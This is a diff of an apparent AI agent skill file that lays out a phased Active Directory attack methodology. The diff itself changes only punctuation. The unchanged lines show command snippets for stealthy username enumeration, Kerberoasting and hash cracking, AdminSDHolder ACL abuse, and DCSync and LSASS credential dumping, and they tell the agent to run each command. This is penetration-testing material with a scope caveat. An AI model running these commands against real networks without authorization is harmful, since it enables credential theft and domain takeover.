@@ -12,7 +12,7 @@ metadata:
 
 A structured, **iterative methodology** for enumerating, analyzing, and compromising Active Directory environments from Linux. Starts from zero credentials and escalates to full domain compromise through enumeration, vulnerability discovery, and **multi-stage exploitation chains**. Every phase feeds into the next; each credential unlock cascades into deeper access.
 
-When this skill is active, **follow the phases in order but iterate**: Phase 0 output feeds Phase 1, Phase 3 findings unlock Phase 4 abuses, Phase 5 credentials upgrade Phase 1, etc. Run each command, collect output, and build the final Markdown report incrementally. Always operate within scope and rules of engagement — AD attack tooling is intrusive, and some techniques (password spraying, DCSync, ticket forging, coercion attacks) can lock out accounts, trigger EDR alerts, or destabilize directory replication if misconfigured.
+When this skill is active, **follow the phases in order but iterate**: Phase 0 output feeds Phase 1, Phase 3 findings unlock Phase 4 abuses, Phase 5 credentials upgrade Phase 1, etc. Run each command, collect output, and build the final Markdown report incrementally. Always operate within scope and rules of engagement: AD attack tooling is intrusive, and some techniques (password spraying, DCSync, ticket forging, coercion attacks) can lock out accounts, trigger EDR alerts, or destabilize directory replication if misconfigured.
 
 ---
 
@@ -67,7 +67,7 @@ mkdir -p "$WORKDIR"/{loot,bloodhound,tickets,secrets,relay}
 echo "Target DC: $DC_IP | Domain: $DOMAIN | Auth: ${USER:-anonymous}"
 ```
 
-Use these variables throughout. **Update them as credentials are obtained in later phases** — this skill is **iterative**: each phase's output can unlock the next. If you crack a password in Phase 3, re-run Phase 1 as that new principal. If you find DCSync rights in Phase 4, pivot to Phase 5 immediately.
+Use these variables throughout. **Update them as credentials are obtained in later phases**: this skill is **iterative**: each phase's output can unlock the next. If you crack a password in Phase 3, re-run Phase 1 as that new principal. If you find DCSync rights in Phase 4, pivot to Phase 5 immediately.
 
 ---
 
@@ -112,7 +112,7 @@ ldapsearch -x -H "ldap://$DC_IP" -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" '(o
 
 ### 0.3 Username enumeration via Kerberos pre-auth (silent, no event logs)
 
-Kerberos pre-auth enumeration doesn't log `4625` (failed logon) events — it only touches the KDC, not SAM. This is the **lowest-noise way** to discover valid usernames.
+Kerberos pre-auth enumeration doesn't log `4625` (failed logon) events: it only touches the KDC, not SAM. This is the **lowest-noise way** to discover valid usernames.
 
 ```bash
 # Wordlist: combine rockyou + common AD usernames (admin, svc_, test_, etc.)
@@ -125,7 +125,7 @@ for rid in $(seq 500 1200); do
 done
 ```
 
-Every valid username here feeds **Phase 3 (AS-REP roasting)** — no password required, just a valid username.
+Every valid username here feeds **Phase 3 (AS-REP roasting)**: no password required, just a valid username.
 
 ### 0.4 Password policy & lockout threshold
 
@@ -158,7 +158,7 @@ smbclient -N -L "//$DC_IP/" 2>&1
 nxc smb "$DC_IP" -u "$USER" -p "$PASS" 2>&1 | tee "$WORKDIR/loot/nxc-smb-auth.txt"
 ```
 
-If output contains `(Pwn3d!)`, this account is a local admin on the DC — **jump directly to Phase 5 for credential dumping.**
+If output contains `(Pwn3d!)`, this account is a local admin on the DC: **jump directly to Phase 5 for credential dumping.**
 
 ### 1.2 Full LDAP enumeration via NetExec
 
@@ -280,7 +280,7 @@ impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile 
 hashcat -m 13100 "$WORKDIR/tickets/spn.hash" /usr/share/wordlists/rockyou.txt -O
 ```
 
-**Every cracked SPN account feeds Phase 4** — check if they're in a privileged group.
+**Every cracked SPN account feeds Phase 4**: check if they're in a privileged group.
 
 ### 3.3 Targeted Kerberoasting via writable SPN (self-service escalation)
 
@@ -370,9 +370,9 @@ dacledit.py -action write -target-dn "CN=AdminSDHolder,CN=System,DC=...,DC=..." 
 
 ## Phase 5: Credential Harvesting & Lateral Movement
 
-**Goal:** Extract credentials from every angle — LSASS, SAM, NTDS.dit, cached tickets, GPP passwords.
+**Goal:** Extract credentials from every angle: LSASS, SAM, NTDS.dit, cached tickets, GPP passwords.
 
-### 5.1 DCSync (full NTDS dump — domain compromise)
+### 5.1 DCSync (full NTDS dump: domain compromise)
 
 If your current principal has `Replicating Directory Changes` + `Replicating Directory Changes All` rights (either directly or via group membership, verified in Phase 2/4):
 
@@ -505,7 +505,7 @@ ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "CN=krbtgt,CN=
 
 ---
 
-## Phase 9: Output — Structured Markdown Report
+## Phase 9: Output: Structured Markdown Report
 
 Produce the following report, filling every section with findings from Phases 0-8:
 
@@ -513,7 +513,7 @@ Produce the following report, filling every section with findings from Phases 0-
 # AD Recon Report
 
 **Domain:** `<domain.local>` (NetBIOS: `<DOMAIN>`)
-**Domain Controller:** `<hostname>` (`<IP>`) — `<OS build>`
+**Domain Controller:** `<hostname>` (`<IP>`): `<OS build>`
 **Starting access:** `<unauthenticated / username@domain>`
 **Ending access:** `<highest privilege obtained>`
 **Analysis date:** `<YYYY-MM-DD>`
@@ -534,7 +534,7 @@ Produce the following report, filling every section with findings from Phases 0-
 | **Total** | **N** | **Critical / High / Medium** | **N/A** |
 
 **Overall Risk Rating:** [Critical / High / Medium / Low]  
-**Path to Domain Admin Found:** [Yes — N steps / No / Partial]
+**Path to Domain Admin Found:** [Yes: N steps / No / Partial]
 
 ---
 
